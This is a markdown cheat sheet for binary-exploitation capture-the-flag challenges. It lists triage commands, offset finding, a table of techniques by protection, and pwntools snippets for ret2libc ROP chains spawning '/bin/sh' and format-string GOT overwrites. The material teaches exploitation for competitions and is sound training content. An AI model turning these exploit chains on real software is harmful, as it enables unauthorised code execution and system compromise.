# Pwn

Start from `rangekit/ctf/templates/pwn_exploit.py` (local / GDB / REMOTE switches).

## Triage

```bash
checksec --file=chall          # NX, PIE, canary, RELRO decide the technique
file chall ; ldd chall         # arch, which libc
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . chall   # run with the provided libc
seccomp-tools dump ./chall     # only if syscalls look filtered
```

## Find the offset

```python
from pwn import *
io = process("./chall"); io.sendline(cyclic(300)); io.wait()
core = io.corefile; print(cyclic_find(core.read(core.rsp, 4)))   # x86-64: value at rsp at the crash
```

## Technique by protections

| Protections | Technique |
|---|---|
| no NX | shellcode: `asm(shellcraft.sh())` on the stack, jump to it |
| NX, no PIE, `win()` exists | ret2win: `flat({off: elf.sym.win})` (add a bare `ret` gadget first if it crashes in `movaps`) |
| NX, no PIE | ret2libc: leak `puts@got` via `puts@plt`, return to `main`, then `system("/bin/sh")` |
| PIE | leak a code pointer first (format string `%p`, partial overwrite) |
| canary | leak it (`%<n>$p`, off-by-one read) or overwrite something before it |
| Full RELRO, libc known | `one_gadget libc.so.6`, `__free_hook` (old glibc) or ROP on the stack |

```python
rop = ROP(elf); rop.puts(elf.got.puts); rop.main()        # stage 1: leak
libc.address = leak - libc.sym.puts
rop2 = ROP(libc); rop2.raw(rop2.ret); rop2.system(next(libc.search(b"/bin/sh")))
```

## Format string

```python
# find your input's position: send "AAAAAAAA" + ".%p" * 20 and count to 0x4141414141414141
payload = fmtstr_payload(offset, {elf.got.exit: elf.sym.win})
```

## Useful

```bash
ROPgadget --binary chall | grep -E ': pop rdi ; ret$'
one_gadget ./libc.so.6
```

- Unknown libc from a leak: libc.rip (online) with two leaked symbol offsets.
- Heap challenges: identify the glibc version first (tcache since 2.26, safe-linking since 2.32).
